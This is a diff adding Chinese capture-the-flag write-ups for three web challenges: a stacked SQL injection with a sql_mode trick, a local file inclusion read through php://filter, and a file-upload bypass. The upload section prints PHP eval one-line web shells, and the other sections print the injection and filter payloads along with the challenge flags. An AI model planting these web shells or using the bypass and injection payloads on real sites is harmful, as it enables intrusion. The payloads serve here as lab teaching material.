@@ -1189,7 +1189,192 @@ array(2) {
 
 ------
 
+### [SUCTF 2019]EasySQL
 
+堆叠注入，`1; show databases;`查看数据库：
+
+```
+Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
+```
+
+`1;show tables;`查看当前数据库中所有表的名称：
+
+```
+Array ( [0] => 1 ) Array ( [0] => Flag )
+```
+
+`1;select * from Flag;` 回显`nonono`，被过滤啦。补充系统变量`@sql_mode`，`sql_mode`是一组`mysql`支持的基本语法及校验规则。`PIPES_AS_CONCAT`：将`||`视为字符串的连接操作符,而非或运算符。
+
+`1;set sql_mode=PIPES_AS_CONCAT;select 1`得到`flag{349eefe9-8887-4732-bf27-381fe6e857b8}`。
+
+```
+Array ( [0] => 1 ) Array ( [0] => 1flag{349eefe9-8887-4732-bf27-381fe6e857b8} )
+```
+
+------
+
+### [极客大挑战 2019]Secret File
+
+`view-source`查看源码发现`./action.php`。
+
+```html
+<!DOCTYPE html>
+<html>
+<style type="text/css" >
+#master	{
+    position:absolute;
+    left:44%;
+    bottom:20;
+    text-align :center;
+    	}
+        p,h1 {
+                cursor: default;
+        }
+</style>
+	<head>
+		<meta charset="utf-8">
+		<title>绝密档案</title>
+	</head>
+	<body style="background-color:black;"><br><br><br><br><br><br>
+		<h1 style="font-family:verdana;color:red;text-align:center;">
+		我把他们都放在这里了，去看看吧		<br>
+		</h1><br><br><br><br><br><br>
+		<a id="master" href="./action.php" style="background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;">
+			<font size=6>SECRET</font>
+		</a>
+	<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
+	</body>
+</html>
+```
+
+访问`/action.php`，点击`SECRET`，很快就重定向到`/end.php`啦。
+
+```html
+<!DOCTYPE html>
+<html>
+<style>
+        p,h1 {
+                cursor: default;
+        }
+</style>
+	<head>
+		<meta charset="utf-8">
+		<title>END</title>
+	</head>
+	<body style="background-color:black;"><br><br><br><br><br><br>
+		<h1 style="font-family:verdana;color:red;text-align:center;">查阅结束</h1><br><br><br>	
+		<p style="font-family:arial;color:red;font-size:20px;text-align:center;">没看清么？回去再仔细看看吧。</p>
+		<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
+	</body>
+</html>
+```
+
+用`Burp Suite pro`抓包，`Send to Repeater`，`Send`得到：
+
+```html
+HTTP/1.1 302 Found
+Server: openresty
+Date: Tue, 22 Nov 2022 09:46:35 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Location: end.php
+X-Powered-By: PHP/7.3.11
+Content-Length: 63
+
+<!DOCTYPE html>
+<html>
+<!--
+   secr3t.php
+-->
+</html>
+```
+
+访问`/secr3t.php`得到：
+
+```php+HTML
+<html>
+    <title>secret</title>
+    <meta charset="UTF-8">
+<?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    $file=$_GET['file'];
+    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+        echo "Oh no!";
+        exit();
+    }
+    include($file); 
+//flag放在了flag.php里
+?>
+</html>
+```
+
+使用文件包含代码查看`flag.php`，`/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php`：
+
+```
+PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ODUzNDIxZjktYWFiNy00Zjk4LWE3N2UtMGRkMDNlMWU3ODc0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
+```
+
+用`Burp Suite pro`的`Decoder`进行`Base64`解码得到：
+
+```
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>FLAG</title>
+    </head>
+    <body style="background-color:black;"><br><br><br><br><br><br>
+        <h1 style="font-family:verdana;color:red;text-align:center;">ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~</h1><br><br><br>
+        
+        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
+            <?php
+                echo "æå°±å¨è¿é";
+                $flag = 'flag{853421f9-aab7-4f98-a77e-0dd03e1e7874}';
+                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
+            ?>
+        </p>
+    </body>
+
+</html>
+
+```
+
+提交`flag{853421f9-aab7-4f98-a77e-0dd03e1e7874}`即可。
+
+------
+
+### [极客大挑战 2019]Upload
+
+文件上传题。编写一句话木马，上传`.php`文件后显示**Not image!**
+
+```php
+<?php @eval($_POST['shell']) ?>
+```
+
+抓包修改`Content-Type`字段为`image/jpeg`进行绕过，上传后显示**NOT! php!**
+
+`.php`文件被拦截了，修改PHP后缀进行绕过，上传`.phtml	`文件后显示**NO! HACKER! your file included '<?'**
+
+```
+phtml、pht、php、php3、php4、php5
+```
+
+发现`<?`被靶机检测出来了，修改一句话木马：
+
+```php
+<script language="php">eval($_REQUEST[shell])</script>
+```
+
+抓包修改`Content-Type`字段为`image/jpeg`，上传`.phtml	`文件后显示**Don't lie to me, it's not image at all!!!**
+
+添加文件头`GIF89a?`后，重新上传`.phtml	`文件显示**上传文件名: wdnmd.phtml**。唯独你没懂。
+
+```php
+GIF89a?<script language="php">eval($_REQUEST[shell])</script>
+```
+
+用[AntSword](https://github.com/AntSwordProject/antSword)连接`ip/upload/wdnmd.phtml`，在根目录下发现`flag`，提交`flag{5d49bb79-1b31-4bbc-a816-d1114e9b079a}`即可。
 
 ------
 
